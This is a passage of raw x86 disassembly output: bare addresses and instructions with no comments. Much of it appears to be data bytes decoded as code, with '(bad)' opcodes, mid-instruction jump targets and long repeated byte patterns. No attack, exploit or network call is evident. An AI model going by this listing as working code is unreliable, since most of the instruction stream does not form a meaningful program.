  44da82:	and    eax,0x1c7cc200
  44da87:	cmp    ebx,DWORD PTR [edi]
  44da89:	jge    0x44dadf
  44da8b:	cmp    edi,DWORD PTR [edi+0x7d]
  44da8e:	pop    esi
  44da8f:	cmp    edi,DWORD PTR [ebp+0x203b957c]
  44da95:	jge    0x44da35
  44da97:	cmp    ebx,DWORD PTR ds:0x7d3bd67d
  44da9d:	jl     0x44da8f
  44da9f:	cmp    eax,DWORD PTR [ebx+0x7c]
  44daa2:	out    0x3b,eax
  44daa4:	cwde   
  44daa5:	repnz xor BYTE PTR [ebx+edx*4],bh
  44daa9:	repnz sub BYTE PTR [ebx+eax*1],bh
  44daad:	jp     0x44db21
  44daaf:	cmp    al,0x41
  44dab1:	jns    0x44db1c
  44dab3:	cmp    al,0xd4
  44dab5:	jns    0x44da53
  44dab7:	cmp    al,0xdf
  44dab9:	jns    0x44da8f
  44dabb:	cmp    al,0xbf
  44dabd:	jns    0x44da9d
  44dabf:	cmp    al,0x9d
  44dac1:	jns    0x44dad8
  44dac3:	cmp    eax,0x3d29f22a
  44dac8:	clc    
  44dac9:	icebp  
  44daca:	inc    ecx
  44dacb:	cmp    eax,0xef2e8
  44dad0:	cmp    DWORD PTR [ebp-0x518e0016],esi
  44dad6:	push   cs
  44dad7:	add    BYTE PTR [ebp+0x7e],bl
  44dada:	inc    ebp
  44dadb:	xor    DWORD PTR [eax],eax
  44dadd:	add    BYTE PTR [eax],al
  44dadf:	add    BYTE PTR [eax],al
  44dae1:	les    eax,FWORD PTR [ebp+0x7aca3403]
  44dae7:	loop   0x44db1d
  44dae9:	cdq    
  44daea:	or     ebx,0xef80fe35
  44daf0:	xor    eax,0x36427f2f
  44daf5:	(bad)  
  44daf7:	cmp    DWORD PTR [eax],edi
  44daf9:	out    dx,al
  44dafa:	jl     0x44db4e
  44dafc:	cmp    BYTE PTR [ebx+0x7b],bh
  44daff:	(bad)  
  44db00:	cmp    edx,DWORD PTR [eax-0x53c5d7c1]
  44db06:	lea    ecx,[esi+0x25]
  44db09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44db0a:	nop
  44db0b:	daa    
  44db0c:	add    BYTE PTR [eax-0x280403b5],dl
  44db12:	adc    BYTE PTR [edx],0x0
  44db15:	nop
  44db16:	adc    ah,BYTE PTR [ebx]
  44db18:	int    0x80
  44db1a:	jmp    0x181f:0x4b82f81b
  44db21:	xor    DWORD PTR [edi+0x1639a1d],0x20
  44db28:	push   esp
  44db29:	pop    esp
  44db2a:	ins    DWORD PTR es:[edi],dx
  44db2b:	and    BYTE PTR [eax+0x64],ch
  44db2e:	imul   esp,DWORD PTR [eax],0x20045c6c
  44db34:	add    ah,0xd2
  44db37:	es nop
  44db39:	mov    esp,0xc49626b8
  44db3e:	out    dx,al
  44db3f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  44db41:	mov    esp,0xb526d6
  44db46:	add    BYTE PTR [eax],al
  44db48:	add    BYTE PTR [eax],al
  44db4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44db4b:	xchg   edx,eax
  44db4c:	rcr    BYTE PTR es:[eax+ebx*4-0x4f5b2ada],cl
  44db54:	es lock pushf 
  44db57:	inc    esp
  44db58:	and    BYTE PTR [ecx],cl
  44db5a:	test   DWORD PTR [edi+0x21],edx
  44db5d:	or     al,0x7d
  44db5f:	mov    al,0x1f
  44db61:	push   ds
  44db62:	test   DWORD PTR [ecx+eiz*1],eax
  44db65:	int3   
  44db66:	jge    0x44db30
  44db68:	and    DWORD PTR [ebp+0x4221ae66],ecx
  44db6e:	pop    edi
  44db6f:	shl    BYTE PTR [edx],0x8c
  44db72:	addr16 sub eax,0xdf5fa523
  44db78:	and    esi,DWORD PTR [eax+ecx*8-0x373bdbf7]
  44db7f:	mov    dl,0xa5
  44db81:	cmp    esp,esp
  44db83:	jp     0x44db1a
  44db85:	cmp    ebp,esp
  44db87:	jp     0x44db0e
  44db89:	cmp    esp,esp
  44db8b:	jp     0x44db82
  44db8d:	cmp    cl,BYTE PTR [ecx+edi*2+0x79843ac5]
  44db94:	aad    0x3a
  44db96:	lods   al,BYTE PTR ds:[esi]
  44db97:	jns    0x44db3e
  44db99:	cmp    al,BYTE PTR [ecx+edi*2+0x794c3b35]
  44dba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44dba1:	cmp    ah,BYTE PTR [ecx+edi*2-0x2b]
  44dba5:	cmp    ch,BYTE PTR [ecx+edi*2]
  44dba8:	lds    edi,FWORD PTR [edx]
  44dbaa:	and    al,0x79
  44dbac:	jne    0x44dbe8
  44dbae:	add    BYTE PTR [eax],al
  44dbb0:	add    BYTE PTR [eax],al
  44dbb2:	add    BYTE PTR [edx+edi*2],cl
  44dbb5:	inc    ebp
  44dbb6:	cmp    al,BYTE PTR [edx+edi*2]
  44dbb9:	xchg   ebp,eax
  44dbba:	cmp    ch,ah
  44dbbc:	jns    0x44dc23
  44dbbe:	cmp    al,BYTE PTR [ecx+edi*2+0x35]
  44dbc2:	cmp    cl,BYTE PTR [ecx+edi*2+0x25]
  44dbc6:	cmp    ah,BYTE PTR [ecx+edi*2+0x15]
  44dbca:	cmp    ch,BYTE PTR [ecx+edi*2+0x5]
  44dbce:	cmp    dl,BYTE PTR [eax+0x6463f5b2]
  44dbd4:	aaa    
  44dbd5:	add    edx,DWORD PTR es:[eax+0x5433f5b2]
  44dbdc:	xchg   ecx,ecx
  44dbde:	xor    ebp,DWORD PTR [eax-0x1fcc567e]
  44dbe4:	sub    DWORD PTR [ecx],0x37
  44dbe7:	in     al,0x83
  44dbe9:	pop    ecx
  44dbea:	aaa    
  44dbeb:	mov    esp,0x4377183
  44dbf0:	sub    DWORD PTR [ecx+0x37],0xffffffdc
  44dbf4:	and    BYTE PTR [ecx-0x267cbbc9],0x37
  44dbfb:	sbb    al,0x83
  44dbfd:	push   cs
  44dbfe:	in     eax,0xbf
  44dc00:	sahf   
  44dc01:	and    bh,ch
  44dc03:	mov    bh,0x7e
  44dc05:	and    dh,BYTE PTR ds:0xd22dec0
  44dc0b:	sar    BYTE PTR [esi+0x1ea06522],0x23
  44dc12:	cmp    eax,0xb522fea0
  44dc17:	add    BYTE PTR [eax],al
  44dc19:	add    BYTE PTR [eax],al
  44dc1b:	add    BYTE PTR [eax-0x5f72dca2],ah
  44dc21:	ds and esp,ebp
  44dc24:	sbb    BYTE PTR [esi+0x7e80bd21],0x21
  44dc2b:	mov    ch,0x80
  44dc2d:	fisub  WORD PTR [ecx]
  44dc2f:	int    0x80
  44dc31:	mov    esi,0x1e616521
  44dc36:	and    al,BYTE PTR [ecx+0x79220e61]
  44dc3c:	popa   
  44dc3d:	push   es
  44dc3e:	and    al,BYTE PTR [ecx+0x2921fe61]
  44dc44:	shl    esi,0x21
  44dc47:	and    ecx,eax
  44dc49:	outs   dx,BYTE PTR ds:[esi]
  44dc4a:	and    bh,BYTE PTR [ecx]
  44dc4c:	shl    DWORD PTR [esi+0x22],0x41
  44dc50:	rcr    DWORD PTR [esi+0x22],0x9
  44dc54:	mov    eax,ds:0xa1012256
  44dc59:	dec    esi
  44dc5a:	and    bh,cl
  44dc5c:	mov    al,ds:0xa1012246
  44dc61:	ds and ch,cl
  44dc64:	xor    DWORD PTR [esi],0xae81e122
  44dc6a:	and    BYTE PTR [ecx],al
  44dc6c:	sbb    BYTE PTR [esi-0x697df6e0],0x20
  44dc73:	add    DWORD PTR [edx-0x72],esp
  44dc76:	and    BYTE PTR [ecx],bl
  44dc78:	bound  eax,QWORD PTR [esi-0x7f6effe0]
  44dc7e:	and    dh,BYTE PTR [esi]
  44dc80:	add    BYTE PTR [eax],al
  44dc82:	add    BYTE PTR [eax],al
  44dc84:	add    BYTE PTR [ecx-0x80],ch
  44dc87:	sub    dh,BYTE PTR [esi]
  44dc89:	mov    cl,0x80
  44dc8b:	push   cs
  44dc8c:	add    cl,bh
  44dc8e:	mov    cl,0xe
  44dc90:	add    cl,ch
  44dc92:	mov    cl,0xe
  44dc94:	add    cl,ch
  44dc96:	mov    cl,0xe
  44dc98:	add    cl,bh
  44dc9a:	mov    cl,0xe
  44dc9c:	add    cl,bh
  44dc9e:	mov    cl,0xe
  44dca0:	add    cl,ch
  44dca2:	mov    cl,0xe
  44dca4:	add    cl,ch
  44dca6:	mov    cl,0xe
  44dca8:	add    BYTE PTR [ecx-0x46fff14f],bh
  44dcae:	mov    cl,0xe
  44dcb0:	add    BYTE PTR [ecx-0x56fff14f],ch
  44dcb6:	mov    cl,0xe
  44dcb8:	add    BYTE PTR [ecx-0x46fff14f],bh
  44dcbe:	mov    cl,0xe
  44dcc0:	add    BYTE PTR [ecx-0x56fff14f],ch
  44dcc6:	mov    cl,0xe
  44dcc8:	add    BYTE PTR [ecx-0x4f],bh
  44dccb:	push   cs
  44dccc:	add    BYTE PTR [ecx-0x4f],bh
  44dccf:	push   cs
  44dcd0:	add    BYTE PTR [ecx-0x4f],ch
  44dcd3:	push   cs
  44dcd4:	add    BYTE PTR [ecx-0x4f],ch
  44dcd7:	push   cs
  44dcd8:	add    BYTE PTR [ecx-0x4f],bh
  44dcdb:	push   cs
  44dcdc:	add    BYTE PTR [ecx-0x4f],bh
  44dcdf:	push   cs
  44dce0:	add    BYTE PTR [ecx-0x4f],ch
  44dce3:	push   cs
  44dce4:	add    BYTE PTR [ecx-0x4f],ch
  44dce7:	push   cs
  44dce8:	add    BYTE PTR [eax],al
  44dcea:	add    BYTE PTR [eax],al
  44dcec:	add    BYTE PTR [eax],al
  44dcee:	cmp    DWORD PTR [ecx-0x4ec6fff2],esi
  44dcf4:	push   cs
  44dcf5:	add    BYTE PTR [ecx],ch
  44dcf7:	mov    cl,0xe
  44dcf9:	add    BYTE PTR [ecx],ch
  44dcfb:	mov    cl,0xe
  44dcfd:	add    BYTE PTR [eax-0x6ffff3b5],dl
  44dd03:	dec    ebx
  44dd04:	or     al,0x0
  44dd06:	nop
  44dd07:	dec    ebx
  44dd08:	or     al,0x0
  44dd0a:	nop
  44dd0b:	dec    ebx
  44dd0c:	or     al,0x0
  44dd0e:	nop
  44dd0f:	dec    ebx
  44dd10:	or     al,0x0
  44dd12:	nop
  44dd13:	dec    ebx
  44dd14:	or     al,0x0
  44dd16:	nop
  44dd17:	dec    ebx
  44dd18:	or     al,0x0
  44dd1a:	nop
  44dd1b:	dec    ebx
  44dd1c:	or     al,0x0
  44dd1e:	nop
  44dd1f:	dec    ebx
  44dd20:	or     al,0x0
  44dd22:	nop
  44dd23:	dec    ebx
  44dd24:	or     al,0x0
  44dd26:	nop
  44dd27:	dec    ebx
  44dd28:	or     al,0x0
  44dd2a:	nop
  44dd2b:	dec    ebx
  44dd2c:	or     al,0x0
  44dd2e:	nop
  44dd2f:	dec    ebx
  44dd30:	or     al,0x0
  44dd32:	nop
  44dd33:	dec    ebx
  44dd34:	or     al,0x0
  44dd36:	nop
  44dd37:	dec    ebx
  44dd38:	or     al,0x0
  44dd3a:	nop
  44dd3b:	dec    ebx
  44dd3c:	or     al,0x0
  44dd3e:	nop
  44dd3f:	dec    ebx
  44dd40:	or     al,0x0
  44dd42:	nop
  44dd43:	dec    ebx
  44dd44:	or     al,0x0
  44dd46:	nop
  44dd47:	dec    ebx
  44dd48:	or     al,0x0
  44dd4a:	nop
  44dd4b:	dec    ebx
  44dd4c:	or     al,0x0
  44dd4e:	nop
  44dd4f:	dec    ecx
  44dd50:	or     al,0x0
  44dd52:	add    BYTE PTR [eax],al
  44dd54:	add    BYTE PTR [eax],al
  44dd56:	add    BYTE PTR [eax-0x6ffff3b7],dl
  44dd5c:	dec    ecx
  44dd5d:	or     al,0x0
  44dd5f:	nop
  44dd60:	dec    ecx
  44dd61:	or     al,0x0
  44dd63:	nop
  44dd64:	dec    ecx
  44dd65:	or     al,0x0
  44dd67:	nop
  44dd68:	dec    ecx
  44dd69:	or     al,0x0
  44dd6b:	nop
  44dd6c:	dec    ecx
  44dd6d:	or     al,0x0
  44dd6f:	nop
  44dd70:	dec    ecx
  44dd71:	or     al,0x0
  44dd73:	nop
  44dd74:	dec    ecx
  44dd75:	or     al,0x0
  44dd77:	nop
  44dd78:	dec    ecx
  44dd79:	or     al,0x0
  44dd7b:	nop
  44dd7c:	mov    dl,0xf5
  44dd7e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dd84:	mov    dl,0xf5
  44dd86:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dd8c:	mov    dl,0xf5
  44dd8e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dd94:	mov    dl,0xf5
  44dd96:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dd9c:	mov    dl,0xf5
  44dd9e:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dda4:	mov    dl,0xf5
  44dda6:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddac:	mov    dl,0xf5
  44ddae:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddb4:	mov    dl,0xf5
  44ddb6:	add    edx,DWORD PTR [eax+0x3f5b2]
  44ddbc:	add    BYTE PTR [eax],al
  44ddbe:	add    BYTE PTR [eax],al
  44ddc0:	nop
  44ddc1:	mov    dl,0xf5
  44ddc3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddc9:	mov    dl,0xf5
  44ddcb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddd1:	mov    dl,0xf5
  44ddd3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddd9:	mov    dl,0xf5
  44dddb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dde1:	mov    dl,0xf5
  44dde3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dde9:	mov    dl,0xf5
  44ddeb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddf1:	mov    dl,0xf5
  44ddf3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44ddf9:	mov    dl,0xe
  44ddfb:	jmp    0xe9539093
  44de00:	xchg   ebx,eax
  44de01:	mov    dl,0xe
  44de03:	jmp    0xe953909b
  44de08:	xchg   ebx,eax
  44de09:	mov    dl,0xe
  44de0b:	jmp    0xe95390a3
  44de10:	xchg   ebx,eax
  44de11:	mov    dl,0xe
  44de13:	jmp    0xe95390ab
  44de18:	xchg   ebx,eax
  44de19:	mov    dl,0xe
  44de1b:	jmp    0xe95390b3
  44de20:	xchg   ebx,eax
  44de21:	mov    dl,0xe
  44de23:	jmp    0x44de28
  44de28:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44de2e:	mov    dl,0xe
  44de30:	jmp    0xe95390c8
  44de35:	xchg   ebx,eax
  44de36:	mov    dl,0xe
  44de38:	jmp    0xe95390d0
  44de3d:	xchg   ebx,eax
  44de3e:	mov    dl,0xe
  44de40:	jmp    0xe95390d8
  44de45:	xchg   ebx,eax
  44de46:	mov    dl,0xe
  44de48:	jmp    0xe95390e0
  44de4d:	xchg   ebx,eax
  44de4e:	mov    dl,0xe
  44de50:	jmp    0xe95390e8
  44de55:	xchg   ebx,eax
  44de56:	mov    dl,0xe
  44de58:	jmp    0xe95390f0
  44de5d:	xchg   ebx,eax
  44de5e:	mov    dl,0xe
  44de60:	jmp    0xe95390f8
  44de65:	xchg   ebx,eax
  44de66:	mov    dl,0xe
  44de68:	jmp    0xe9539100
  44de6d:	xchg   ebx,eax
  44de6e:	mov    dl,0xe
  44de70:	jmp    0xe9539108
  44de75:	xchg   ebx,eax
  44de76:	mov    dl,0xe
  44de78:	add    BYTE PTR [ecx-0x4a],ch
  44de7b:	push   cs
  44de7c:	add    BYTE PTR [ecx],bh
  44de7e:	mov    dh,0xe
  44de80:	add    BYTE PTR [ecx],bh
  44de82:	mov    dh,0xe
  44de84:	add    BYTE PTR [ecx],ch
  44de86:	mov    dh,0xe
  44de88:	add    BYTE PTR [ecx],ch
  44de8a:	mov    dh,0xe
  44de8c:	add    BYTE PTR [eax],al
  44de8e:	add    BYTE PTR [eax],al
  44de90:	add    BYTE PTR [eax],al
  44de92:	cmp    DWORD PTR [esi-0x49c6fff2],esi
  44de98:	push   cs
  44de99:	add    BYTE PTR [ecx],ch
  44de9b:	mov    dh,0xe
  44de9d:	add    BYTE PTR [ecx],ch
  44de9f:	mov    dh,0xe
  44dea1:	add    cl,bh
  44dea3:	mov    ch,0xe
  44dea5:	add    cl,bh
  44dea7:	mov    ch,0xe
  44dea9:	add    cl,ch
  44deab:	mov    ch,0xe
  44dead:	add    cl,ch
  44deaf:	mov    ch,0xe
  44deb1:	add    cl,bh
  44deb3:	mov    ch,0xe
  44deb5:	add    cl,bh
  44deb7:	mov    ch,0xe
  44deb9:	add    cl,ch
  44debb:	mov    ch,0xe
  44debd:	add    cl,ch
  44debf:	mov    ch,0xe
  44dec1:	add    BYTE PTR [ecx-0x46fff14b],bh
  44dec7:	mov    ch,0xe
  44dec9:	add    BYTE PTR [ecx-0x56fff14b],ch
  44decf:	mov    ch,0xe
  44ded1:	add    BYTE PTR [ecx-0x46fff14b],bh
  44ded7:	mov    ch,0xe
  44ded9:	add    BYTE PTR [ecx-0x56fff14b],ch
  44dedf:	mov    ch,0xe
  44dee1:	add    BYTE PTR [ecx-0x4b],bh
  44dee4:	push   cs
  44dee5:	add    BYTE PTR [ecx-0x4b],bh
  44dee8:	push   cs
  44dee9:	add    BYTE PTR [ecx-0x4b],ch
  44deec:	push   cs
  44deed:	add    BYTE PTR [ecx-0x4b],ch
  44def0:	push   cs
  44def1:	add    BYTE PTR [ecx-0x4b],bh
  44def4:	push   cs
  44def5:	add    BYTE PTR [eax],al
  44def7:	add    BYTE PTR [eax],al
  44def9:	add    BYTE PTR [eax],al
  44defb:	nop
  44defc:	sbb    ecx,DWORD PTR [eax+eax*1]
  44deff:	nop
  44df00:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df03:	nop
  44df04:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df07:	nop
  44df08:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df0b:	nop
  44df0c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df0f:	nop
  44df10:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df13:	nop
  44df14:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df17:	nop
  44df18:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df1b:	nop
  44df1c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df1f:	nop
  44df20:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df23:	nop
  44df24:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df27:	nop
  44df28:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df2b:	nop
  44df2c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df2f:	nop
  44df30:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df33:	nop
  44df34:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df37:	nop
  44df38:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df3b:	nop
  44df3c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df3f:	nop
  44df40:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df43:	nop
  44df44:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df47:	nop
  44df48:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df4b:	nop
  44df4c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df4f:	nop
  44df50:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df53:	nop
  44df54:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df57:	nop
  44df58:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df5b:	nop
  44df5c:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df5f:	add    BYTE PTR [eax],al
  44df61:	add    BYTE PTR [eax],al
  44df63:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44df69:	sbb    ecx,DWORD PTR [eax+eax*1]
  44df6c:	nop
  44df6d:	sbb    DWORD PTR [eax+eax*1],ecx
  44df70:	nop
  44df71:	sbb    DWORD PTR [eax+eax*1],ecx
  44df74:	nop
  44df75:	sbb    DWORD PTR [eax+eax*1],ecx
  44df78:	nop
  44df79:	mov    dl,0xf5
  44df7b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44df81:	mov    dl,0xf5
  44df83:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44df89:	mov    dl,0xf5
  44df8b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44df91:	mov    dl,0xf5
  44df93:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44df99:	mov    dl,0xf5
  44df9b:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfa1:	mov    dl,0xf5
  44dfa3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfa9:	mov    dl,0xf5
  44dfab:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfb1:	mov    dl,0xf5
  44dfb3:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfb9:	mov    dl,0xf5
  44dfbb:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfc1:	mov    dl,0xf5
  44dfc3:	add    edx,DWORD PTR [eax+0x3f5b2]
  44dfc9:	add    BYTE PTR [eax],al
  44dfcb:	add    BYTE PTR [eax],al
  44dfcd:	nop
  44dfce:	mov    dl,0xf5
  44dfd0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfd6:	mov    dl,0xf5
  44dfd8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfde:	mov    dl,0xf5
  44dfe0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfe6:	mov    dl,0xf5
  44dfe8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dfee:	mov    dl,0xf5
  44dff0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44dff6:	mov    dl,0xe
  44dff8:	jmp    0xe9539290
  44dffd:	xchg   ebx,eax
  44dffe:	mov    dl,0xe
  44e000:	jmp    0xe9539298
  44e005:	xchg   ebx,eax
  44e006:	mov    dl,0xe
  44e008:	jmp    0xe95392a0
  44e00d:	xchg   ebx,eax
  44e00e:	mov    dl,0xe
  44e010:	jmp    0xe95392a8
  44e015:	xchg   ebx,eax
  44e016:	mov    dl,0xe
  44e018:	jmp    0xe95392b0
  44e01d:	xchg   ebx,eax
  44e01e:	mov    dl,0xe
  44e020:	jmp    0xe95392b8
  44e025:	xchg   ebx,eax
  44e026:	mov    dl,0xe
  44e028:	jmp    0xe95392c0
  44e02d:	xchg   ebx,eax
  44e02e:	mov    dl,0xe
  44e030:	jmp    0x44e035
  44e035:	add    BYTE PTR [ebx-0x6c16f14e],dl
  44e03b:	mov    dl,0xe
  44e03d:	jmp    0xe95392d5
  44e042:	xchg   ebx,eax
  44e043:	mov    dl,0xe
  44e045:	jmp    0xe95392dd
  44e04a:	xchg   ebx,eax
  44e04b:	mov    dl,0xe
  44e04d:	jmp    0xe95392e5
  44e052:	xchg   ebx,eax
  44e053:	mov    dl,0xe
  44e055:	jmp    0xe95392ed
  44e05a:	xchg   ebx,eax
  44e05b:	mov    dl,0xe
  44e05d:	jmp    0xe95392f5
  44e062:	xchg   ebx,eax
  44e063:	mov    dl,0xe
  44e065:	jmp    0xe95392fd
  44e06a:	xchg   ebx,eax
  44e06b:	mov    dl,0xe
  44e06d:	jmp    0xe9539305
  44e072:	xchg   ebx,eax
  44e073:	mov    dl,0xe
  44e075:	add    BYTE PTR [ecx-0x4e],bh
  44e078:	push   cs
  44e079:	add    BYTE PTR [ecx-0x4e],bh
  44e07c:	push   cs
  44e07d:	add    BYTE PTR [ecx-0x4e],ch
  44e080:	push   cs
  44e081:	add    BYTE PTR [ecx-0x4e],ch
  44e084:	push   cs
  44e085:	add    BYTE PTR [ecx-0x4e],bh
  44e088:	push   cs
  44e089:	add    BYTE PTR [ecx-0x4e],bh
  44e08c:	push   cs
  44e08d:	add    BYTE PTR [ecx-0x4e],ch
  44e090:	push   cs
  44e091:	add    BYTE PTR [ecx-0x4e],ch
  44e094:	push   cs
  44e095:	add    BYTE PTR [ecx],bh
  44e097:	mov    dl,0xe
  44e099:	add    BYTE PTR [eax],al
  44e09b:	add    BYTE PTR [eax],al
  44e09d:	add    BYTE PTR [eax],al
  44e09f:	cmp    DWORD PTR [edx-0x4dd6fff2],esi
  44e0a5:	push   cs
  44e0a6:	add    BYTE PTR [ecx],ch
  44e0a8:	mov    dl,0xe
  44e0aa:	add    BYTE PTR [ecx],bh
  44e0ac:	mov    dl,0xe
  44e0ae:	add    BYTE PTR [ecx],bh
  44e0b0:	mov    dl,0xe
  44e0b2:	add    BYTE PTR [ecx],ch
  44e0b4:	mov    dl,0xe
  44e0b6:	add    BYTE PTR [ecx],ch
  44e0b8:	mov    dl,0xe
  44e0ba:	add    cl,bh
  44e0bc:	mov    cl,0xe
  44e0be:	add    cl,bh
  44e0c0:	mov    cl,0xe
  44e0c2:	add    cl,ch
  44e0c4:	mov    cl,0xe
  44e0c6:	add    cl,ch
  44e0c8:	mov    cl,0xe
  44e0ca:	add    cl,bh
  44e0cc:	mov    cl,0xe
  44e0ce:	add    cl,bh
  44e0d0:	mov    cl,0xe
  44e0d2:	add    cl,ch
  44e0d4:	mov    cl,0xe
  44e0d6:	add    cl,ch
  44e0d8:	mov    cl,0xe
  44e0da:	add    BYTE PTR [ecx-0x46fff14f],bh
  44e0e0:	mov    cl,0xe
  44e0e2:	add    BYTE PTR [ecx-0x56fff14f],ch
  44e0e8:	mov    cl,0xe
  44e0ea:	add    BYTE PTR [ecx-0x46fff14f],bh
  44e0f0:	mov    cl,0xe
  44e0f2:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e0f8:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e0fb:	nop
  44e0fc:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e0ff:	nop
  44e100:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e103:	add    BYTE PTR [eax],al
  44e105:	add    BYTE PTR [eax],al
  44e107:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e10d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e110:	nop
  44e111:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e114:	nop
  44e115:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e118:	nop
  44e119:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e11c:	nop
  44e11d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e120:	nop
  44e121:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e124:	nop
  44e125:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e128:	nop
  44e129:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e12c:	nop
  44e12d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e130:	nop
  44e131:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e134:	nop
  44e135:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e138:	nop
  44e139:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e13c:	nop
  44e13d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e140:	nop
  44e141:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e144:	nop
  44e145:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e148:	nop
  44e149:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e14c:	nop
  44e14d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e150:	nop
  44e151:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e154:	nop
  44e155:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e158:	nop
  44e159:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e15c:	nop
  44e15d:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e160:	nop
  44e161:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e164:	nop
  44e165:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e168:	nop
  44e169:	sbb    ecx,DWORD PTR [eax+eax*1]
  44e16c:	add    BYTE PTR [eax],al
  44e16e:	add    BYTE PTR [eax],al
  44e170:	add    BYTE PTR [eax-0x6ffff3e5],dl
  44e176:	mov    dl,0xf5
  44e178:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e17e:	mov    dl,0xf5
  44e180:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e186:	mov    dl,0xf5
  44e188:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e18e:	mov    dl,0xf5
  44e190:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e196:	mov    dl,0xf5
  44e198:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e19e:	mov    dl,0xf5
  44e1a0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1a6:	mov    dl,0xf5
  44e1a8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1ae:	mov    dl,0xf5
  44e1b0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1b6:	mov    dl,0xf5
  44e1b8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1be:	mov    dl,0xf5
  44e1c0:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1c6:	mov    dl,0xf5
  44e1c8:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
  44e1ce:	mov    dl,0xf5
  44e1d0:	add    edx,DWORD PTR [eax+0x3f5b2]
  44e1d6:	add    BYTE PTR [eax],al
  44e1d8:	add    BYTE PTR [eax],al
  44e1da:	nop
  44e1db:	mov    dl,0xf5
  44e1dd:	add    edx,DWORD PTR [eax-0x6ffc0a4e]
